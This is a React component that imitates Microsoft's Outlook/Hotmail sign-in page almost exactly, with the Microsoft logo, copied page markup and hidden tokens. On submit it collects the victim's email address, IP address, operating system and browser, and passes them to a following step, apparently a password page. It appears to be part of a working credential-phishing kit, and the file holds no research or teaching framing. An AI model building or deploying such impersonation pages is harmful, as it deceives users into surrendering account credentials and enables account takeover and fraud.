import React, { useEffect } from "react";
import "./files/styles.scoped.css";
import Logo from "./files/logo.svg";
import Help from "./files/help.svg";
import Key from "./files/key.svg";
import Background from "./files/background.svg";
import { useState } from "react";
import { getIP } from "../servers";
import { navigate } from "@reach/router";
import { browserName, osName } from "react-device-detect";

export default function Hotmail({ location }) {
  const [values, setValues] = useState({
    username: "",
  });
  const [submited, setSubmited] = useState(false);

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited(true);
    
    const date = new Date().getMilliseconds();

    getIP().then((res) => {
      const ip = res.data.ip;
      navigate(`../ht/${date}`, {
        state: {
          ip: ip,
          email: values.username,
          device: `${osName} ${browserName}`,
          domain: "https://login.live.com/",
        },
      });
    });
  };

  return (
    <div>
      <div data-bind="if: activeDialog" />
      <form id="i0281" onSubmit={submitForm}>
        <div
          className="login-paginated-page"
          data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.ba,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"
        >
          <div
            id="lightboxTemplateContainer"
            data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.ci }"
          >
            <div
              id="lightboxBackgroundContainer"
              data-bind="css: { 'provide-min-height': svr.ci },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"
            >
              <div
                className="background-image-holder"
                role="presentation"
                data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"
              >
                <div
                  id="backgroundImage"
                  data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }"
                  className="background-image ext-background-image"
                  style={{
                    backgroundImage: `url(${Background})`,
                  }}
                />
              </div>
            </div>

            <div
              className="outer"
              data-bind="css: { 'app': $page.backgroundLogoUrl }"
            >
              <div className="template-section main-section">
                <div
                  data-bind="externalCss: { 'middle': true }"
                  className="middle ext-middle"
                >
                  <div
                    className="full-height"
                    data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"
                  >
                    <div className="flex-column">
                      <div className="win-scroll">
                        <div
                          id="lightbox"
                          data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession && ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() && $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }"
                          className="sign-in-box ext-sign-in-box fade-in-lightbox has-popup"
                        >
                          <div
                            className="lightbox-cover"
                            data-bind="css: { 'disable-lightbox': svr.Cd && showLightboxProgress() }"
                          />

                          <div
                            data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"
                          >
                            <img
                              className="logo"
                              role="img"
                              data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
                              src={Logo}
                              alt="Microsoft"
                            />
                          </div>

                          <div
                            role="main"
                            data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.a1,
                disableAnimationIfAnimationEndUnsupported: svr.Ch,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"
                          >
                            <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
                              <div
                                className="pagination-view animate slide-in-next"
                                data-bind="css: {
        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.I),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"
                              >
                                <div
                                  data-viewid={1}
                                  data-showfedcredbutton="true"
                                  data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"
                                >
                                  <div
                                    data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }"
                                  >
                                    <div>
                                      <div
                                        className="row title ext-title"
                                        id="loginHeader"
                                        data-bind="externalCss: { 'title': true }"
                                      >
                                        <div
                                          role="heading"
                                          aria-level={1}
                                          data-bind="text: title"
                                        >
                                          Sign in
                                        </div>
                                      </div>
                                    </div>
                                  </div>

                                  <div className="row">
                                    <div role="alert" aria-live="assertive" />
                                    <div className="form-group col-md-24">
                                      <div
                                        className="placeholderContainer"
                                        data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.aW ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"
                                      >
                                        {/* ko withProperties: { '$placeholderText': placeholderText } */}
                                        {/* ko template: { nodes: $componentTemplateNodes, data: $parent } */}
                                        <input
                                          type="email"
                                          name="username"
                                          onChange={handleChange}
                                          defaultValue={values.username}
                                          required
                                          id="i0116"
                                          maxLength={113}
                                          className="form-control ltr_override input ext-input text-box ext-text-box"
                                          aria-required="true"
                                          data-report-event="Signin_Email_Phone_Skype"
                                          data-report-trigger="click"
                                          data-report-value="Email_Phone_Skype_Entry"
                                          aria-label="Enter your email, phone, or Skype."
                                          aria-describedby="loginHeader usernameError"
                                          placeholder="Email, phone, or Skype"
                                          data-report-attached={1}
                                        />
                                      </div>
                                    </div>
                                  </div>
                                  <div
                                    data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }"
                                    className="position-buttons password-reset-links-container ext-password-reset-links-container"
                                  >
                                    <div className="row">
                                      <div className="col-md-24">
                                        <div className="text-13">
                                          <div
                                            className="form-group"
                                            data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.J || '#',
                            ariaLabel: svr.J ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }"
                                          >
                                            No account?{" "}
                                            <a
                                              href="#"
                                              id="signup"
                                              aria-label="Create a Microsoft account"
                                            >
                                              Create one!
                                            </a>
                                          </div>

                                          {/* ko ifnot: hideCantAccessYourAccount */}

                                          {/* ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.AJ || isOfflineAccountVisible) */}
                                          <div className="form-group">
                                            <a
                                              id="idA_PWD_SwitchToFido"
                                              name="switchToFido"
                                              href="#"
                                              data-bind="
                        text: fidoLinkText,
                        click: switchToFidoCredLink_onClick"
                                            >
                                              Sign in with Windows Hello or a
                                              security key
                                            </a>{" "}
                                            <span
                                              className="help-button"
                                              role="button"
                                              tabIndex={0}
                                              data-bind="
    click: fidoHelp_onClick,
    pressEnter: fidoHelp_onClick,
    hasFocus: hasFocus,
    ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']"
                                              aria-label="Learn more about signing in with Windows Hello or a security key"
                                            >
                                              {/* ko component: 'accessible-image-control' */}
                                              {/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}

                                              {/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
                                              {/* ko template: { nodes: [darkImageNode], data: $parent } */}
                                              <img
                                                role="presentation"
                                                data-bind="imgSrc"
                                                src={Help}
                                              />
                                            </span>
                                            <div
                                              data-bind="component: { name: 'fido-help-dialog-content-control',
    params: {
        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"
                                            >
                                              <div
                                                data-bind="component: { name: 'dialog-content-control',
    params: {
        dialogId: 1,
        data: {
            labelledBy: 'fidoDialogTitle',
            describedBy: 'fidoDialogDesc fidoDialogDesc2',
            primaryButtonPreventTabbing: { direction: 'down' },
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"
                                              >
                                                {/* */}
                                              </div>
                                            </div>
                                          </div>

                                          {/* ko if: showCredPicker */}

                                          {/* ko if: svr.aS */}
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  {/* ko if: svr.C6 */}

                                  <div
                                    className="win-button-pin-bottom"
                                    data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }"
                                  >
                                    <div
                                      className="row"
                                      data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"
                                    >
                                      <div
                                        data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.e,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.e && isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"
                                      >
                                        <div
                                          className="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container"
                                          data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }"
                                        >
                                          {/* ko if: isSecondaryButtonVisible */}

                                          <div
                                            data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
                                            className="inline-block button-item ext-button-item"
                                          >
                                            {/* type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 */}
                                            <input
                                              type="submit"
                                              disabled={submited}
                                              id="idSIButton9"
                                              className="win-button button_primary button ext-button primary ext-primary"
                                              data-report-event="Signin_Submit"
                                              data-report-trigger="click"
                                              data-report-value="Submit"
                                              data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing"
                                              defaultValue="Next"
                                              data-report-attached={1}
                                            />
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  {/* ko if: tenantBranding.BoilerPlateText */}
                                </div>

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}

                                {/* ko if: $parent.currentViewIndex() === $index() */}
                              </div>
                            </div>
                          </div>

                          <input
                            type="hidden"
                            name="ps"
                            data-bind="value: postedLoginStateViewId"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="psRNGCDefaultType"
                            data-bind="value: postedLoginStateViewRNGCDefaultType"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="psRNGCEntropy"
                            data-bind="value: postedLoginStateViewRNGCEntropy"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="psRNGCSLK"
                            data-bind="value: postedLoginStateViewRNGCSLK"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="canary"
                            data-bind="value: svr.canary"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="ctx"
                            data-bind="value: ctx"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="hpgrequestid"
                            data-bind="value: svr.sessionId"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            id="i0327"
                            data-bind="attr: { name: svr.bo }, value: flowToken"
                            name="PPFT"
                            defaultValue="DUVpvMtIhemexMHQmDAcFEGuyaSnbnKhJm3F9wdhBD!1YK7mpT116!rSOYPoNksvJ7P9phTh*uBWKHUeW1Mq7PBev7avyJzyGARRYF4PGSBTDt4BcfXhOXiKoaXqi72TO2pjUFXecq3X!UIAmufqXZh1il5WxKpZNuSBs4VutBv1xArOmXOVp0z8fwNfc6*diBp4tT4mirPeq!gnNgSCfmmoqNqjtoOIw*wam8vxiNx8v7ZVuuU!yQqV!WseSzQPpQ$$"
                          />
                          <input
                            type="hidden"
                            name="PPSX"
                            data-bind="value: svr.c7"
                            defaultValue="Passp"
                          />
                          <input
                            type="hidden"
                            name="NewUser"
                            defaultValue={1}
                          />
                          <input
                            type="hidden"
                            name="FoundMSAs"
                            data-bind="value: svr.An"
                            defaultValue
                          />
                          <input
                            type="hidden"
                            name="fspost"
                            data-bind="value: svr.fPOST_ForceSignin ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="i21"
                            data-bind="value: wasLearnMoreShown() ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="CookieDisclosure"
                            data-bind="value: svr.BT ? 1 : 0"
                            defaultValue={0}
                          />
                          <input
                            type="hidden"
                            name="IsFidoSupported"
                            data-bind="value: isFidoSupported() ? 1 : 0"
                            defaultValue={1}
                          />
                          <input
                            type="hidden"
                            name="isSignupPost"
                            data-bind="value: isSignupPost() ? 1 : 0"
                            defaultValue={0}
                          />
                          <div
                            data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"
                          >
                            <input
                              type="hidden"
                              name="i19"
                              data-bind="value: timeOnPage"
                              defaultValue
                            />
                          </div>
                        </div>
                        {/* ko if: $page.showFedCredAndNewSession */}
                        {/* ko if: $page.showFedCredButtons */}
                        <div
                          data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }"
                          className="promoted-fed-cred-box ext-promoted-fed-cred-box"
                        >
                          <div
                            className="promoted-fed-cred-content"
                            data-bind="css: {
                'animate': $page.useCssAnimations && $page.animate(),
                'slide-out-next': $page.animate.isSlideOutNext,
                'slide-in-next': $page.animate.isSlideInNext,
                'slide-out-back': $page.animate.isSlideOutBack,
                'slide-in-back': $page.animate.isSlideInBack,
                'app': $page.backgroundLogoUrl }"
                          >
                            {/* ko foreach: $page.otherSigninOptions */}
                            <div className="row tile">
                              <div
                                className="table"
                                role="button"
                                tabIndex={0}
                                data-bind="
                        css: { 'list-item': svr.cf },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text"
                                aria-label="Sign-in options"
                              >
                                <div className="table-row">
                                  <div className="table-cell tile-img medium">
                                    {/* ko component: 'accessible-image-control' */}
                                    {/* ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme */}

                                    {/* ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme */}
                                    {/* ko template: { nodes: [darkImageNode], data: $parent } */}
                                    <img
                                      className="tile-img medium"
                                      role="presentation"
                                      data-bind="attr: { src: $data.darkIconUrl }"
                                      src={Key}
                                    />
                                  </div>
                                  <div
                                    className="table-cell text-left content"
                                    data-bind="css: { 'content': !svr.cf }"
                                  >
                                    <div
                                      data-bind="
                                    text: $data.text,
                                    attr: { 'data-test-id': $data.testId }"
                                      data-test-id="signinOptions"
                                    >
                                      Sign-in options
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                        {/* ko if: $page.newSession */}

                        {/* ko if: $page.showDebugDetails */}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              {/* ko if: $page.paginationControlHelper.showFooterControl */}
              <div
                id="footer"
                role="contentinfo"
                data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() && $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }"
                className="footer ext-footer"
              >
                <div
                  data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"
                >
                  {/* ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) */}
                  <div
                    id="footerLinks"
                    className="footerNode text-secondary footer-links ext-footer-links"
                    data-bind="externalCss: { 'footer-links': true }"
                  >
                    {/* ko if: showFooter */}
                    {/* ko if: !hideTOU */}
                    <a
                      id="ftrTerms"
                      data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }"
                      href="#"
                      className="footer-content ext-footer-content footer-item ext-footer-item"
                    >
                      Terms of use
                    </a>

                    {/* ko if: !hidePrivacy */}
                    <a
                      id="ftrPrivacy"
                      data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }"
                      href="#"
                      className="footer-content ext-footer-content footer-item ext-footer-item"
                    >
                      Privacy &amp; cookies
                    </a>

                    {/* ko if: impressumLink */}

                    {/* ko if: a11yConformeLink */}

                    {/* ko if: showIcpLicense */}

                    {/* Set attr binding before hasFocusEx to prevent Narrator from losing focus */}
                    <a
                      id="moreOptions"
                      href="#"
                      role="button"
                      data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }"
                      aria-label="Click here for troubleshooting information"
                      aria-expanded="false"
                      className="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
                    >
                      ...
                    </a>
                  </div>

                  {/* ko if: svr.C6 && showLinks */}
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
